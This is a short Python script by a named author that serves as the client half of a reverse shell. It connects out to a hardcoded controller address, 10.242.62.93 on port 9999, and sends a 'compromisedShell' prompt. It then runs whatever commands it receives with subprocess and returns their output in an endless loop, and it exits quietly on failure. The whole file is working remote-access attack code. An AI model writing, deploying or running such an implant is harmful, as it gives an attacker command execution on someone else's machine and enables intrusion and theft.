#!/usr/bin/python3
'''
Author: Ezra Fast
Description: This is the brother code to handleShell.py; this reaches out to the controlling machine and runs a shell that can be accessed from the controller
Date: November 2, 2023
'''

sHOST = '10.242.62.93'
sPORT = 9999

PROMPT = b'compromisedShell[$]'

import subprocess
import socket
import argparse

def executeCommand(commandString):                              # takes in raw command string and returns the decoded terminal output
        command = commandString.split(' ')                      # command contains a list of tokens
        try:
            commandOutput = subprocess.check_output(command)        # commandOutput contains the terminal output
        except Exception as e:
            return f'Exception raised: {e}\nHandled.\n'
        return commandOutput.decode()

'''
making the client socket:
        - socketInit = socket.socket(socket.AF_INET, socket_SOCK_STREAM)
        - socketInit.connect((sHOST, sPORT))
        - socketInit.sendall(string.encode())
        - data = socketInit.recv(1024)
'''

def establishConnection():
        socketInit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketInit.connect((sHOST, sPORT))
        return socketInit

'''
session flow:
        - send prompt
        - receive command
        - execute command
        - send output
        - repeat
'''

def session(socket):
        commandOutput = ''
        command = ''
        while True:
                if len(commandOutput) >= 1:
                        socket.sendall(commandOutput.encode())
                socket.sendall(PROMPT)
                while 1:
                        data = socket.recv(1024)
                        command += data.decode()
                        if len(data) < 1024:
                                break
                commandOutput = executeCommand(command)
                socket.sendall(commandOutput.encode())
                command = ''


if __name__ == "__main__":
    try:
        socketConnected = establishConnection()
        session(socketConnected)
    except:
        exit(0)
